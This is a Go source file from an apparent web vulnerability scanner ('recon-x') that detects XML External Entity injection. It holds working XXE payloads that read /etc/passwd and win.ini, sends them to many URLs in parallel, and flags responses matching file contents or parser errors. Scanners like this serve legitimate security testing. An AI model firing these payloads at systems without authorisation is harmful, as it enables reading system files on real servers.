package xxe

import (
	"io"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/bytezora/recon-x/internal/finding"
	"github.com/bytezora/recon-x/internal/httpclient"
)

type Result struct {
	URL      string
	Payload  string
	Evidence string
	Detected bool
}

func (r Result) ToFinding() finding.Finding {
	return finding.Finding{
		Type:               "xxe",
		Severity:           finding.High,
		Confidence:         finding.Likely,
		Title:              "XML External Entity (XXE) Injection",
		AffectedURL:        r.URL,
		Evidence:           r.Evidence,
		Reason:             "XML input with external entity reference returned file content or error leaking path info",
		Remediation:        "Disable external entity processing in XML parser. Use safe parsing libraries. Validate XML input.",
		ManualVerification: true,
	}
}

var xxePayloads = []struct {
	payload     string
	contentType string
}{
	{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		"application/xml",
	},
	{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		"text/xml",
	},
	{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>`,
		"application/xml",
	},
}

var xxeLinuxSigs = []string{"root:x:0:0", "daemon:", "bin/bash"}
var xxeWindowsSigs = []string{"[fonts]", "[extensions]", "for 16-bit app support"}
var xxeErrorSigs = []string{
	"failed to open stream",
	"no such file",
	"entity",
	"xml parsing error",
	"libxml",
	"simplexml",
}

func testURL(client *http.Client, rawURL string) []Result {
	var results []Result
	seen := map[string]bool{}

	allSigs := append(xxeLinuxSigs, xxeWindowsSigs...)

	for _, p := range xxePayloads {
		key := rawURL + "|" + p.contentType
		if seen[key] {
			continue
		}

		req, err := http.NewRequest("POST", rawURL, strings.NewReader(p.payload))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", p.contentType)
		req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		body := strings.ToLower(string(data))

		for _, sig := range allSigs {
			if strings.Contains(body, strings.ToLower(sig)) {
				seen[key] = true
				results = append(results, Result{
					URL:      rawURL,
					Payload:  truncate(p.payload, 50) + "...",
					Evidence: "XXE file content signature found: " + sig,
					Detected: true,
				})
				break
			}
		}
		if seen[key] {
			continue
		}
		for _, sig := range xxeErrorSigs {
			if strings.Contains(body, sig) {
				seen[key] = true
				results = append(results, Result{
					URL:      rawURL,
					Payload:  truncate(p.payload, 50) + "...",
					Evidence: "XXE error indicator: " + sig,
					Detected: true,
				})
				break
			}
		}
	}
	return results
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

func Detect(urls []string, threads int, onFound func(Result)) []Result {
	if threads <= 0 {
		threads = 10
	}
	client := httpclient.New(15*time.Second, false)

	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
		seen    = make(map[string]bool)
	)

	for _, rawURL := range urls {
		sem <- struct{}{}
		wg.Add(1)
		go func(u string) {
			defer func() { <-sem; wg.Done() }()
			found := testURL(client, u)
			if len(found) > 0 {
				mu.Lock()
				for _, r := range found {
					key := r.URL + "|" + r.Evidence
					if !seen[key] {
						seen[key] = true
						results = append(results, r)
						if onFound != nil {
							onFound(r)
						}
					}
				}
				mu.Unlock()
			}
		}(rawURL)
	}
	wg.Wait()
	return results
}
